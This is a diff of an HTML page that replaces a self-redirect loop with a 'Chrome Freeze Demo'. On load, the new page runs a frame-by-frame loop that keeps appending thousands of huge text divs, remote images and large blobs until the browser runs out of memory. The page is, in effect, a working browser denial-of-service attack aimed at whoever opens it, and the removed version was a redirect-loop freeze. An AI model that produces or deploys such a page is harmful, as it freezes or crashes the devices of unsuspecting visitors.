@@ -3,18 +3,75 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Broken GitHub Pages Demo</title>
-
-  <meta http-equiv="refresh" content="0; url=https://zebbyannan-pixel.github.io/github-pages-freeze-demo/" />
-
-  <script>
-    setInterval(() => {
-      location.href = "https://zebbyannan-pixel.github.io/github-pages-freeze-demo/";
-    }, 10);
-  </script>
+  <title>Chrome Freeze Demo</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #111;
+      color: white;
+      margin: 0;
+      padding: 20px;
+      overflow: hidden;
+    }
+    #status {
+      position: fixed;
+      top: 20px;
+      left: 20px;
+      z-index: 9999;
+      font-size: 18px;
+      font-weight: bold;
+      color: #ffcc00;
+    }
+  </style>
 </head>
 <body>
-  <h1>Redirecting...</h1>
-  <p>If this page stays open, your browser may freeze because it is stuck in a redirect loop.</p>
+  <div id="status">Loading...</div>
+
+  <script>
+    const status = document.getElementById('status');
+    let counter = 0;
+
+    function buildExplosion() {
+      counter++;
+      status.textContent = 'Crash in ' + counter + 'ms';
+
+      const fragment = document.createDocumentFragment();
+      const chunk = 'X'.repeat(20000);
+
+      for (let i = 0; i < 500; i++) {
+        const div = document.createElement('div');
+        div.textContent = chunk + ' ' + counter + ' ' + i;
+        div.style.cssText = `
+          display:block;
+          font-size: 10px;
+          line-height: 1.1;
+          color: #fff;
+          white-space: pre;
+          word-break: break-all;
+        `;
+        fragment.appendChild(div);
+      }
+
+      document.body.appendChild(fragment);
+
+      const img = new Image();
+      img.src = 'https://picsum.photos/400/400?random=' + Math.random();
+      img.style.display = 'none';
+      document.body.appendChild(img);
+
+      const blob = new Blob([new Array(200000).join('A')], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const link = document.createElement('a');
+      link.href = url;
+      link.textContent = 'blob';
+      document.body.appendChild(link);
+
+      URL.revokeObjectURL(url);
+
+      requestAnimationFrame(buildExplosion);
+    }
+
+    buildExplosion();
+  </script>
 </body>
 </html>
